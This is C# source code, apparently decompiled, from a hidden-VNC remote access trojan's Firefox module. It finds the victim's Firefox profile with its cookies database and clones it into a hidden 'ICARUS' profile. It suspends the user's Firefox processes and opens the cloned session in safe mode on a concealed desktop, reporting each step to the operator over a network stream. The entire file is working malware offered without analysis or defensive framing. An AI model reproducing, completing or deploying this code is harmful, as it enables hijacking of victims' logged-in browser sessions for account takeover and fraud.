using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser;

public class Firefox
{
	private const short SWP_NOMOVE = 2;

	private const short SWP_NOSIZE = 1;

	private const short SWP_NOZORDER = 4;

	private const int SWP_SHOWWINDOW = 64;

	[DllImport("user32.dll")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

	public static void StartFirefox(bool duplicate)
	{
		try
		{
			if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\ICARUS\\parent.lock"))))
			{
				Outils.SendInformation(Outils.nstream, "25|Firefox has already been opened!");
				return;
			}
			string path = Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles";
			string text = string.Empty;
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (File.Exists(text2 + "\\cookies.sqlite"))
				{
					text = Path.GetFileName(text2);
					break;
				}
			}
			if (duplicate)
			{
				Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));
				MonitorDirSize monitorDirSize = new MonitorDirSize();
				monitorDirSize.StartMonitoring(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\ICARUS");
				try
				{
					Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text, Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\ICARUS", overwrite: true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				monitorDirSize.StopMonitoring();
				Outils.SendInformation(Outils.nstream, "202|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));
			}
			else
			{
				Outils.SendInformation(Outils.nstream, "203|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));
			}
			Process[] processesByName = Process.GetProcessesByName("firefox");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.SuspendProcess(processesByName[i]);
			}
			Process.Start("firefox", "-new-window \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\ICARUS\"");
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			IntPtr intPtr = IntPtr.Zero;
			while (intPtr == IntPtr.Zero)
			{
				Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
				Firefox.SetWindowPos(Outils.FindHandle("Firefox Safe Mode"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
				intPtr = Outils.FindHandle("Firefox Safe Mode");
				if (stopwatch.ElapsedMilliseconds >= 5000)
				{
					break;
				}
			}
			stopwatch.Stop();
			Outils.PostMessage(intPtr, 256u, (IntPtr)13, (IntPtr)1);
			Stopwatch stopwatch2 = new Stopwatch();
			stopwatch2.Start();
			while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
			{
				Rectangle workingArea2 = Screen.AllScreens[0].WorkingArea;
				Firefox.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea2.Left, workingArea2.Top, workingArea2.Width, workingArea2.Height, 68);
				Application.DoEvents();
				if (stopwatch2.ElapsedMilliseconds >= 5000)
				{
					processesByName = Process.GetProcessesByName("firefox");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.ResumeProcess(processesByName[i]);
					}
					break;
				}
			}
			stopwatch2.Stop();
			processesByName = Process.GetProcessesByName("firefox");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.ResumeProcess(processesByName[i]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
